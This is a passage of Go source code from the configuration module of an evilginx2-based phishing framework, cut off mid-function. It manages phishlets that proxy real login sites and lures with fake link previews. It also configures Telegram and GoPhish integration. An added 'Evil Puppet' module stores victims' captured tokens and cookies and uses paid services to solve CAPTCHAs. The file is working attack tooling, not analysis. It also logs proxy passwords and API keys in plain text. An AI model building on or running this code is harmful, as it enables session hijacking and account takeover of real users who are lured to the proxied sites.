package core

import (
	"fmt"
	"net/url"
	"path/filepath"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/log"

	"github.com/spf13/viper"
)

var BLACKLIST_MODES = []string{"all", "unauth", "noadd", "off"}

type Lure struct {
	Id              string `mapstructure:"id" json:"id" yaml:"id"`
	Hostname        string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
	Path            string `mapstructure:"path" json:"path" yaml:"path"`
	RedirectUrl     string `mapstructure:"redirect_url" json:"redirect_url" yaml:"redirect_url"`
	Phishlet        string `mapstructure:"phishlet" json:"phishlet" yaml:"phishlet"`
	Redirector      string `mapstructure:"redirector" json:"redirector" yaml:"redirector"`
	UserAgentFilter string `mapstructure:"ua_filter" json:"ua_filter" yaml:"ua_filter"`
	Info            string `mapstructure:"info" json:"info" yaml:"info"`
	OgTitle         string `mapstructure:"og_title" json:"og_title" yaml:"og_title"`
	OgDescription   string `mapstructure:"og_desc" json:"og_desc" yaml:"og_desc"`
	OgImageUrl      string `mapstructure:"og_image" json:"og_image" yaml:"og_image"`
	OgUrl           string `mapstructure:"og_url" json:"og_url" yaml:"og_url"`
	PausedUntil     int64  `mapstructure:"paused" json:"paused" yaml:"paused"`
}


type SubPhishlet struct {
	Name       string            `mapstructure:"name" json:"name" yaml:"name"`
	ParentName string            `mapstructure:"parent_name" json:"parent_name" yaml:"parent_name"`
	Params     map[string]string `mapstructure:"params" json:"params" yaml:"params"`
}

type PhishletConfig struct {
	Hostname  string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
	UnauthUrl string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
	Enabled   bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	Visible   bool   `mapstructure:"visible" json:"visible" yaml:"visible"`
}

type ProxyConfig struct {
	Type     string `mapstructure:"type" json:"type" yaml:"type"`
	Address  string `mapstructure:"address" json:"address" yaml:"address"`
	Port     int    `mapstructure:"port" json:"port" yaml:"port"`
	Username string `mapstructure:"username" json:"username" yaml:"username"`
	Password string `mapstructure:"password" json:"password" yaml:"password"`
	Enabled  bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
}

type BlacklistConfig struct {
	Mode string `mapstructure:"mode" json:"mode" yaml:"mode"`
}

type CertificatesConfig struct {
}

type GoPhishConfig struct {
	AdminUrl    string `mapstructure:"admin_url" json:"admin_url" yaml:"admin_url"`
	ApiKey      string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
	InsecureTLS bool   `mapstructure:"insecure" json:"insecure" yaml:"insecure"`
}

type GeneralConfig struct {
	Domain       string `mapstructure:"domain" json:"domain" yaml:"domain"`
	OldIpv4      string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
	ExternalIpv4 string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
	BindIpv4     string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
	UnauthUrl    string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
	HttpsPort    int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
	DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
	Autocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
}

type Config struct {
	general         *GeneralConfig
	certificates    *CertificatesConfig
	blacklistConfig *BlacklistConfig
	gophishConfig   *GoPhishConfig
	proxyConfig     *ProxyConfig
	puppetConfig    *PuppetConfig     // NEW: Evil Puppet config
	puppetSessions  []*PuppetSession  // NEW: Active puppet sessions
	phishletConfig  map[string]*PhishletConfig
	phishlets       map[string]*Phishlet
	phishletNames   []string
	activeHostnames []string
	redirectorsDir  string
	lures           []*Lure
	lureIds         []string
	subphishlets    []*SubPhishlet
	telegramConfig  *TelegramConfig
	cfg             *viper.Viper
}
const (
	CFG_GENERAL      = "general"
	CFG_CERTIFICATES = "certificates"
	CFG_LURES        = "lures"
	CFG_PROXY        = "proxy"
	CFG_PHISHLETS    = "phishlets"
	CFG_BLACKLIST    = "blacklist"
	CFG_SUBPHISHLETS = "subphishlets"
	CFG_GOPHISH      = "gophish"
	CFG_TELEGRAM     = "telegram"
	CFG_PUPPET       = "puppet"       // NEW
	CFG_PUPPET_SESSIONS = "puppet_sessions" // NEW
)

const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll

func NewConfig(cfg_dir string, path string) (*Config, error) {
	c := &Config{
		general:         &GeneralConfig{},
		certificates:    &CertificatesConfig{},
		gophishConfig:   &GoPhishConfig{},
		proxyConfig:     &ProxyConfig{},         // Initialize proxyConfig
		puppetConfig:    NewDefaultPuppetConfig(), // NEW
		puppetSessions:  []*PuppetSession{},       // NEW
		phishletConfig:  make(map[string]*PhishletConfig),
		phishlets:       make(map[string]*Phishlet),
		phishletNames:   []string{},
		lures:           []*Lure{},
		blacklistConfig: &BlacklistConfig{},
		telegramConfig:  &TelegramConfig{},
	}

	// Setup Viper
	c.cfg = viper.New()
	c.cfg.SetConfigType("json")
	c.cfg.SetConfigName("config")
	c.cfg.AddConfigPath(cfg_dir)
	c.cfg.AddConfigPath(path)

	// Set defaults
	c.cfg.SetDefault(CFG_GENERAL, c.general)
	c.cfg.SetDefault(CFG_CERTIFICATES, c.certificates)
	c.cfg.SetDefault(CFG_LURES, c.lures)
	c.cfg.SetDefault(CFG_PHISHLETS, c.phishletConfig)
	c.cfg.SetDefault(CFG_BLACKLIST, c.blacklistConfig)
	c.cfg.SetDefault(CFG_GOPHISH, c.gophishConfig)
	c.cfg.SetDefault(CFG_TELEGRAM, c.telegramConfig)
	c.cfg.SetDefault(CFG_PUPPET, c.puppetConfig)

	// Read config
	if err := c.cfg.ReadInConfig(); err != nil {
		if _, ok := err.(viper.ConfigFileNotFoundError); ok {
			// Config file not found; ignore error if desired or log it
			log.Debug("Config file not found, using defaults")
			// Force the config file path so WriteConfig works later
			c.cfg.SetConfigFile(filepath.Join(cfg_dir, "config.json"))
		} else {
			// Config file was found but another error produced
			log.Error("Config file error: %v", err)
		}
	}

	// Unmarshal config
	c.cfg.UnmarshalKey(CFG_GENERAL, c.general)
	c.cfg.UnmarshalKey(CFG_CERTIFICATES, c.certificates)
	c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
	c.cfg.UnmarshalKey(CFG_PHISHLETS, &c.phishletConfig)
	c.cfg.UnmarshalKey(CFG_BLACKLIST, c.blacklistConfig)
	c.cfg.UnmarshalKey(CFG_GOPHISH, c.gophishConfig)
	c.cfg.UnmarshalKey(CFG_TELEGRAM, c.telegramConfig)
	c.cfg.UnmarshalKey(CFG_PROXY, c.proxyConfig)

	// Load puppet config
	c.cfg.UnmarshalKey(CFG_PUPPET, &c.puppetConfig)
	c.cfg.UnmarshalKey(CFG_PUPPET_SESSIONS, &c.puppetSessions)
	
	// Initialize default if empty
	if c.puppetConfig == nil {
		c.puppetConfig = NewDefaultPuppetConfig()
		c.SavePuppetConfig()
	}

    // Refresh active hostnames
	c.refreshActiveHostnames()

	return c, nil
}

func (c *Config) PhishletConfig(site string) *PhishletConfig {
	if o, ok := c.phishletConfig[site]; ok {
		return o
	} else {
		o := &PhishletConfig{
			Hostname:  "",
			UnauthUrl: "",
			Enabled:   false,
			Visible:   true,
		}
		c.phishletConfig[site] = o
		return o
	}
}

func (c *Config) SavePhishlets() {
	c.cfg.Set(CFG_PHISHLETS, c.phishletConfig)
	c.cfg.WriteConfig()
}

func (c *Config) SetSiteHostname(site string, hostname string) bool {
	if c.general.Domain == "" {
		log.Error("you need to set server top-level domain, first. type: server your-domain.com")
		return false
	}
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if pl.isTemplate {
		log.Error("phishlet is a template - can't set hostname")
		return false
	}
	if hostname != "" && hostname != c.general.Domain && !strings.HasSuffix(hostname, "."+c.general.Domain) {
		log.Error("phishlet hostname must end with '%s'", c.general.Domain)
		return false
	}
	log.Info("phishlet '%s' hostname set to: %s", site, hostname)
	c.PhishletConfig(site).Hostname = hostname
	c.SavePhishlets()
	return true
}

func (c *Config) SetSiteUnauthUrl(site string, _url string) bool {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if pl.isTemplate {
		log.Error("phishlet is a template - can't set unauth_url")
		return false
	}
	if _url != "" {
		_, err := url.ParseRequestURI(_url)
		if err != nil {
			log.Error("invalid URL: %s", err)
			return false
		}
	}
	log.Info("phishlet '%s' unauth_url set to: %s", site, _url)
	c.PhishletConfig(site).UnauthUrl = _url
	c.SavePhishlets()
	return true
}

func (c *Config) SetBaseDomain(domain string) {
	c.general.Domain = domain
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server domain set to: %s", domain)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerIP(ip_addr string) {
	c.general.OldIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	//log.Info("server IP set to: %s", ip_addr)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerExternalIP(ip_addr string) {
	c.general.ExternalIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server external IP set to: %s", ip_addr)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerBindIP(ip_addr string) {
	c.general.BindIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server bind IP set to: %s", ip_addr)
	log.Warning("you may need to restart evilginx for the changes to take effect")
	c.cfg.WriteConfig()
}

func (c *Config) SetHttpsPort(port int) {
	c.general.HttpsPort = port
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("https port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) SetDnsPort(port int) {
	c.general.DnsPort = port
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("dns port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) EnableProxy(enabled bool) {
	c.proxyConfig.Enabled = enabled
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	if enabled {
		log.Info("enabled proxy")
	} else {
		log.Info("disabled proxy")
	}
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyType(ptype string) {
	ptypes := []string{"http", "https", "socks5", "socks5h"}
	if !stringExists(ptype, ptypes) {
		log.Error("invalid proxy type selected")
		return
	}
	c.proxyConfig.Type = ptype
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy type set to: %s", ptype)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyAddress(address string) {
	c.proxyConfig.Address = address
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy address set to: %s", address)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyPort(port int) {
	c.proxyConfig.Port = port
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyUsername(username string) {
	c.proxyConfig.Username = username
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy username set to: %s", username)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyPassword(password string) {
	c.proxyConfig.Password = password
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy password set to: %s", password)
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishAdminUrl(k string) {
	u, err := url.ParseRequestURI(k)
	if err != nil {
		log.Error("invalid url: %s", err)
		return
	}

	c.gophishConfig.AdminUrl = u.String()
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish admin url set to: %s", u.String())
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishApiKey(k string) {
	c.gophishConfig.ApiKey = k
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish api key set to: %s", k)
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishInsecureTLS(k bool) {
	c.gophishConfig.InsecureTLS = k
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish insecure set to: %v", k)
	c.cfg.WriteConfig()
}

func (c *Config) IsLureHostnameValid(hostname string) bool {
	for _, l := range c.lures {
		if l.Hostname == hostname {
			if c.PhishletConfig(l.Phishlet).Enabled {
				return true
			}
		}
	}
	return false
}

func (c *Config) SetSiteEnabled(site string) error {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return err
	}
	if c.PhishletConfig(site).Hostname == "" {
		return fmt.Errorf("enabling phishlet '%s' requires its hostname to be set up", site)
	}
	if pl.isTemplate {
		return fmt.Errorf("phishlet '%s' is a template - you have to 'create' child phishlet from it, with predefined parameters, before you can enable it.", site)
	}
	c.PhishletConfig(site).Enabled = true
	c.refreshActiveHostnames()
	c.VerifyPhishlets()
	log.Info("enabled phishlet '%s'", site)

	c.SavePhishlets()
	return nil
}

func (c *Config) SetSiteDisabled(site string) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	c.PhishletConfig(site).Enabled = false
	c.refreshActiveHostnames()
	log.Info("disabled phishlet '%s'", site)

	c.SavePhishlets()
	return nil
}

func (c *Config) SetSiteHidden(site string, hide bool) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	c.PhishletConfig(site).Visible = !hide
	c.refreshActiveHostnames()

	if hide {
		log.Info("phishlet '%s' is now hidden and all requests to it will be redirected", site)
	} else {
		log.Info("phishlet '%s' is now reachable and visible from the outside", site)
	}
	c.SavePhishlets()
	return nil
}

func (c *Config) SetRedirectorsDir(path string) {
	c.redirectorsDir = path
}

func (c *Config) ResetAllSites() {
	c.phishletConfig = make(map[string]*PhishletConfig)
	c.SavePhishlets()
}

func (c *Config) IsSiteEnabled(site string) bool {
	return c.PhishletConfig(site).Enabled
}

func (c *Config) IsSiteHidden(site string) bool {
	return !c.PhishletConfig(site).Visible
}

func (c *Config) GetEnabledSites() []string {
	var sites []string
	for k, o := range c.phishletConfig {
		if o.Enabled {
			sites = append(sites, k)
		}
	}
	return sites
}

func (c *Config) SetBlacklistMode(mode string) {
	if stringExists(mode, BLACKLIST_MODES) {
		c.blacklistConfig.Mode = mode
		c.cfg.Set(CFG_BLACKLIST, c.blacklistConfig)
		c.cfg.WriteConfig()
	}
	log.Info("blacklist mode set to: %s", mode)
}

func (c *Config) SetUnauthUrl(_url string) {
	c.general.UnauthUrl = _url
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("unauthorized request redirection URL set to: %s", _url)
	c.cfg.WriteConfig()
}

func (c *Config) EnableAutocert(enabled bool) {
	c.general.Autocert = enabled
	if enabled {
		log.Info("autocert is now enabled")
	} else {
		log.Info("autocert is now disabled")
	}
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
}

func (c *Config) refreshActiveHostnames() {
	c.activeHostnames = []string{}
	sites := c.GetEnabledSites()
	for _, site := range sites {
		pl, err := c.GetPhishlet(site)
		if err != nil {
			continue
		}
		for _, host := range pl.GetPhishHosts(false) {
			c.activeHostnames = append(c.activeHostnames, strings.ToLower(host))
		}
	}
	for _, l := range c.lures {
		if stringExists(l.Phishlet, sites) {
			if l.Hostname != "" {
				c.activeHostnames = append(c.activeHostnames, strings.ToLower(l.Hostname))
			}
		}
	}
}

func (c *Config) GetActiveHostnames(site string) []string {
	var ret []string
	sites := c.GetEnabledSites()
	for _, _site := range sites {
		if site == "" || _site == site {
			pl, err := c.GetPhishlet(_site)
			if err != nil {
				continue
			}
			for _, host := range pl.GetPhishHosts(false) {
				ret = append(ret, strings.ToLower(host))
			}
		}
	}
	for _, l := range c.lures {
		if site == "" || l.Phishlet == site {
			if l.Hostname != "" {
				hostname := strings.ToLower(l.Hostname)
				ret = append(ret, hostname)
			}
		}
	}
	return ret
}

func (c *Config) IsActiveHostname(host string) bool {
	host = strings.ToLower(host)
	if host[len(host)-1:] == "." {
		host = host[:len(host)-1]
	}
	for _, h := range c.activeHostnames {
		if h == host {
			return true
		}
	}
	return false
}

func (c *Config) AddPhishlet(site string, pl *Phishlet) {
	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = pl
	c.VerifyPhishlets()
}

func (c *Config) AddSubPhishlet(site string, parent_site string, customParams map[string]string) error {
	pl, err := c.GetPhishlet(parent_site)
	if err != nil {
		return err
	}
	_, err = c.GetPhishlet(site)
	if err == nil {
		return fmt.Errorf("phishlet '%s' already exists", site)
	}
	sub_pl, err := NewPhishlet(site, pl.Path, &customParams, c)
	if err != nil {
		return err
	}
	sub_pl.ParentName = parent_site

	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = sub_pl
	c.VerifyPhishlets()

	return nil
}

func (c *Config) DeleteSubPhishlet(site string) error {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		return err
	}
	if pl.ParentName == "" {
		return fmt.Errorf("phishlet '%s' can't be deleted - you can only delete child phishlets.", site)
	}

	c.phishletNames = removeString(site, c.phishletNames)
	delete(c.phishlets, site)
	delete(c.phishletConfig, site)
	c.SavePhishlets()
	return nil
}

func (c *Config) LoadSubPhishlets() {
	var subphishlets []*SubPhishlet
	c.cfg.UnmarshalKey(CFG_SUBPHISHLETS, &subphishlets)
	for _, spl := range subphishlets {
		err := c.AddSubPhishlet(spl.Name, spl.ParentName, spl.Params)
		if err != nil {
			log.Error("phishlets: %s", err)
		}
	}
}

func (c *Config) SaveSubPhishlets() {
	var subphishlets []*SubPhishlet
	for _, pl := range c.phishlets {
		if pl.ParentName != "" {
			spl := &SubPhishlet{
				Name:       pl.Name,
				ParentName: pl.ParentName,
				Params:     pl.customParams,
			}
			subphishlets = append(subphishlets, spl)
		}
	}

	c.cfg.Set(CFG_SUBPHISHLETS, subphishlets)
	c.cfg.WriteConfig()
}

func (c *Config) VerifyPhishlets() {
	hosts := make(map[string]string)

	for site, pl := range c.phishlets {
		if pl.isTemplate {
			continue
		}
		for _, ph := range pl.proxyHosts {
			phish_host := combineHost(ph.phish_subdomain, ph.domain)
			orig_host := combineHost(ph.orig_subdomain, ph.domain)
			if c_site, ok := hosts[phish_host]; ok {
				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", phish_host, site, c_site)
			} else if c_site, ok := hosts[orig_host]; ok {
				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", orig_host, site, c_site)
			}
			hosts[phish_host] = site
			hosts[orig_host] = site
		}
	}
}

func (c *Config) CleanUp() {

	for k := range c.phishletConfig {
		_, err := c.GetPhishlet(k)
		if err != nil {
			delete(c.phishletConfig, k)
		}
	}
	c.SavePhishlets()
	/*
		var sites_enabled []string
		var sites_hidden []string
		for k := range c.siteDomains {
			_, err := c.GetPhishlet(k)
			if err != nil {
				delete(c.siteDomains, k)
			} else {
				if c.IsSiteEnabled(k) {
					sites_enabled = append(sites_enabled, k)
				}
				if c.IsSiteHidden(k) {
					sites_hidden = append(sites_hidden, k)
				}
			}
		}
		c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
		c.cfg.Set(CFG_SITES_ENABLED, sites_enabled)
		c.cfg.Set(CFG_SITES_HIDDEN, sites_hidden)
		c.cfg.WriteConfig()*/
}

func (c *Config) AddLure(site string, l *Lure) {
	c.lures = append(c.lures, l)
	c.lureIds = append(c.lureIds, GenRandomToken())
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
}

func (c *Config) SetLure(index int, l *Lure) error {
	if index >= 0 && index < len(c.lures) {
		c.lures[index] = l
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) DeleteLure(index int) error {
	if index >= 0 && index < len(c.lures) {
		c.lures = append(c.lures[:index], c.lures[index+1:]...)
		c.lureIds = append(c.lureIds[:index], c.lureIds[index+1:]...)
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) DeleteLures(index []int) []int {
	tlures := []*Lure{}
	tlureIds := []string{}
	di := []int{}
	for n, l := range c.lures {
		if !intExists(n, index) {
			tlures = append(tlures, l)
			// Check if lureIds has this index before accessing
			if n < len(c.lureIds) {
				tlureIds = append(tlureIds, c.lureIds[n])
			}
		} else {
			di = append(di, n)
		}
	}
	if len(di) > 0 {
		c.lures = tlures
		c.lureIds = tlureIds
		c.cfg.Set(CFG_LURES, c.lures)
		c.cfg.WriteConfig()
	}
	return di
}

func (c *Config) GetLure(index int) (*Lure, error) {
	if index >= 0 && index < len(c.lures) {
		return c.lures[index], nil
	} else {
		return nil, fmt.Errorf("index out of bounds: %d", index)
	}
}

func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, error) {
	for _, l := range c.lures {
		if l.Phishlet == site {
			pl, err := c.GetPhishlet(site)
			if err == nil {
				if host == l.Hostname || host == pl.GetLandingPhishHost() {
					if l.Path == path {
						return l, nil
					}
				}
			}
		}
	}
	return nil, fmt.Errorf("lure for path '%s' not found", path)
}

func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
	pl, ok := c.phishlets[site]
	if !ok {
		return nil, fmt.Errorf("phishlet '%s' not found", site)
	}
	return pl, nil
}

func (c *Config) GetPhishletNames() []string {
	return c.phishletNames
}

func (c *Config) GetSiteDomain(site string) (string, bool) {
	if o, ok := c.phishletConfig[site]; ok {
		return o.Hostname, ok
	}
	return "", false
}

func (c *Config) GetSiteUnauthUrl(site string) (string, bool) {
	if o, ok := c.phishletConfig[site]; ok {
		return o.UnauthUrl, ok
	}
	return "", false
}

func (c *Config) GetBaseDomain() string {
	return c.general.Domain
}

func (c *Config) GetServerExternalIP() string {
	return c.general.ExternalIpv4
}

func (c *Config) GetServerBindIP() string {
	return c.general.BindIpv4
}

func (c *Config) GetHttpsPort() int {
	return c.general.HttpsPort
}

func (c *Config) GetDnsPort() int {
	return c.general.DnsPort
}

func (c *Config) GetRedirectorsDir() string {
	return c.redirectorsDir
}

func (c *Config) GetBlacklistMode() string {
	return c.blacklistConfig.Mode
}

func (c *Config) IsAutocertEnabled() bool {
	return c.general.Autocert
}

func (c *Config) GetGoPhishAdminUrl() string {
	return c.gophishConfig.AdminUrl
}

func (c *Config) GetGoPhishApiKey() string {
	return c.gophishConfig.ApiKey
}

func (c *Config) GetGoPhishInsecureTLS() bool {
	return c.gophishConfig.InsecureTLS
}

func (c *Config) SetTelegramToken(token string) {
	c.telegramConfig.Token = token
	c.cfg.Set(CFG_TELEGRAM, c.telegramConfig)
	log.Info("telegram token set")
	c.cfg.WriteConfig()
}

func (c *Config) SetTelegramChatId(chatId string) {
	c.telegramConfig.ChatId = chatId
	c.cfg.Set(CFG_TELEGRAM, c.telegramConfig)
	log.Info("telegram chat_id set to: %s", chatId)
	c.cfg.WriteConfig()
}


// PuppetConfig returns the Evil Puppet configuration
func (c *Config) GetPuppetConfig() *PuppetConfig {
	if c.puppetConfig == nil {
		c.puppetConfig = NewDefaultPuppetConfig()
	}
	return c.puppetConfig
}


// SavePuppetConfig saves Evil Puppet configuration
func (c *Config) SavePuppetConfig() {
	c.cfg.Set(CFG_PUPPET, c.puppetConfig)
	c.cfg.WriteConfig()
}

// SavePuppetSessions saves active puppet sessions
func (c *Config) SavePuppetSessions() {
	c.cfg.Set(CFG_PUPPET_SESSIONS, c.puppetSessions)
	c.cfg.WriteConfig()
}

// EnablePuppet enables/disables Evil Puppet module
func (c *Config) EnablePuppet(enabled bool) {
	c.puppetConfig.Enabled = enabled
	c.SavePuppetConfig()
	if enabled {
		log.Info("Evil Puppet module enabled")
	} else {
		log.Info("Evil Puppet module disabled")
	}
}

// SetPuppetCaptchaService sets CAPTCHA service
func (c *Config) SetPuppetCaptchaService(service string) {
	validServices := []string{"2captcha", "anti-captcha", "capsolver", "none"}
	if !stringExists(service, validServices) {
		log.Error("invalid CAPTCHA service. valid options: %v", validServices)
		return
	}
	c.puppetConfig.CaptchaService = service
	c.SavePuppetConfig()
	log.Info("Evil Puppet CAPTCHA service set to: %s", service)
}

// SetPuppetCaptchaAPIKey sets CAPTCHA API key
func (c *Config) SetPuppetCaptchaAPIKey(apiKey string) {
	c.puppetConfig.CaptchaAPIKey = apiKey
	c.SavePuppetConfig()
	log.Info("Evil Puppet CAPTCHA API key set")
}

// AddPuppetTrigger adds a new puppet trigger
func (c *Config) AddPuppetTrigger(trigger *PuppetTrigger) error {
	// Validate trigger
	if trigger.Name == "" {
		return fmt.Errorf("trigger name cannot be empty")
	}
	if len(trigger.Domains) == 0 {
		return fmt.Errorf("trigger must have at least one domain")
	}
	if trigger.Token == "" {
		return fmt.Errorf("trigger token cannot be empty")
	}
	if trigger.OpenUrl == "" {
		return fmt.Errorf("trigger open_url cannot be empty")
	}
	
	// Check for duplicate ID
	for _, t := range c.puppetConfig.Triggers {
		if t.Id == trigger.Id && trigger.Id != "" {
			return fmt.Errorf("trigger with ID %s already exists", trigger.Id)
		}
		if t.Name == trigger.Name {
			return fmt.Errorf("trigger with name %s already exists", trigger.Name)
		}
	}
	
	// Generate ID if not provided
	if trigger.Id == "" {
		trigger.Id = GenRandomToken()
	}
	
	c.puppetConfig.Triggers = append(c.puppetConfig.Triggers, *trigger)
	c.SavePuppetConfig()
	log.Info("Added Evil Puppet trigger: %s", trigger.Name)
	return nil
}

// UpdatePuppetTrigger updates an existing trigger
func (c *Config) UpdatePuppetTrigger(id string, trigger *PuppetTrigger) error {
	for i, t := range c.puppetConfig.Triggers {
		if t.Id == id {
			trigger.Id = id // Preserve ID
			c.puppetConfig.Triggers[i] = *trigger
			c.SavePuppetConfig()
			log.Info("Updated Evil Puppet trigger: %s", trigger.Name)
			return nil
		}
	}
	return fmt.Errorf("trigger with ID %s not found", id)
}

// DeletePuppetTrigger deletes a trigger
func (c *Config) DeletePuppetTrigger(id string) error {
	for i, t := range c.puppetConfig.Triggers {
		if t.Id == id {
			name := t.Name
			c.puppetConfig.Triggers = append(c.puppetConfig.Triggers[:i], c.puppetConfig.Triggers[i+1:]...)
			c.SavePuppetConfig()
			log.Info("Deleted Evil Puppet trigger: %s", name)
			return nil
		}
	}
	return fmt.Errorf("trigger with ID %s not found", id)
}

// GetPuppetTrigger retrieves a trigger by ID
func (c *Config) GetPuppetTrigger(id string) (*PuppetTrigger, error) {
	for _, t := range c.puppetConfig.Triggers {
		if t.Id == id {
			return &t, nil
		}
	}
	return nil, fmt.Errorf("trigger with ID %s not found", id)
}

// GetPuppetTriggersForPhishlet returns triggers for a specific phishlet
func (c *Config) GetPuppetTriggersForPhishlet(phishlet string) []PuppetTrigger {
	var triggers []PuppetTrigger
	
	// 1. Add global triggers
	for _, t := range c.puppetConfig.Triggers {
		if t.Phishlet == phishlet || t.Phishlet == "" {
			if t.Enabled {
				triggers = append(triggers, t)
			}
		}
	}
	
	// 2. Add triggers defined in the phishlet itself
	if pl, err := c.GetPhishlet(phishlet); err == nil {
		if pl.puppet != nil {
			log.Debug("[PUPPET] Found %d phishlet-defined triggers for %s", len(pl.puppet.Triggers), phishlet)
			for _, t := range pl.puppet.Triggers {
				if t.Enabled {
					// Don't add if already added by global config (basic de-duplication by name)
					exists := false
					for _, et := range triggers {
						if et.Name == t.Name {
							exists = true
							break
						}
					}
					if !exists {
						// Ensure phishlet name is set
						if t.Phishlet == "" {
							t.Phishlet = phishlet
						}
						triggers = append(triggers, t)
					}
				}
			}
		} else {
			log.Debug("[PUPPET] Phishlet %s has no puppet config (nil)", phishlet)
		}
	} else {
		log.Debug("[PUPPET] Failed to get phishlet %s: %v", phishlet, err)
	}
	
	return triggers
}

// GetPuppetTriggerForDomain returns triggers matching a domain
func (c *Config) GetPuppetTriggerForDomain(domain, path string) *PuppetTrigger {
	for _, t := range c.puppetConfig.Triggers {
		if !t.Enabled {
			continue
		}
		
		// Check domain match
		domainMatch := false
		for _, d := range t.Domains {
			if d == "*" || strings.Contains(domain, d) || d == domain {
				domainMatch = true
				break
			}
		}
		
		if !domainMatch {
			continue
		}
		
		// Check path match
		pathMatch := false
		for _, p := range t.Paths {
			if p == "*" || p == path {
				pathMatch = true
				break
			}
			// Support simple wildcard
			if strings.HasSuffix(p, "*") {
				prefix := strings.TrimSuffix(p, "*")
				if strings.HasPrefix(path, prefix) {
					pathMatch = true
					break
				}
			}
		}
		
		if pathMatch {
			return &t
		}
	}
	return nil
}

// AddPuppetSession adds a new puppet session
func (c *Config) AddPuppetSession(session *PuppetSession) {
	session.StartedAt = time.Now()
	c.puppetSessions = append(c.puppetSessions, session)
	c.SavePuppetSessions()
}

// UpdatePuppetSession updates a puppet session
func (c *Config) UpdatePuppetSession(id string, updates map[string]interface{}) error {
	for i, s := range c.puppetSessions {
		if s.Id == id {
			// Apply updates
			if status, ok := updates["status"]; ok {
				c.puppetSessions[i].Status = status.(string)
			}
			if token, ok := updates["token_value"]; ok {
				c.puppetSessions[i].TokenValue = token.(string)
			}
			if cookies, ok := updates["cookies"]; ok {
				c.puppetSessions[i].Cookies = cookies.([]map[string]interface{})
			}
			if err, ok := updates["error"]; ok {
				c.puppetSessions[i].Error = err.(string)
			}
			if updates["completed"] != nil {
				c.puppetSessions[i].CompletedAt = time.Now()
			}
			c.SavePuppetSessions()
			return nil
		}
	}
	return fmt.Errorf("session with ID %s not found", id)
}

// GetPuppetSession retrieves a puppet session
func (c *Config) GetPuppetSession(id string) (*PuppetSession, error) {
	for _, s := range c.puppetSessions {
		if s.Id == id {
			return s, nil
		}
	}
	return nil, fmt.Errorf("session with ID %s not found", id)
}

// GetPuppetSessionsForVictim returns puppet sessions for a victim session
func (c *Config) GetPuppetSessionsForVictim(victimSession string) []*PuppetSession {
	var sessions []*PuppetSession
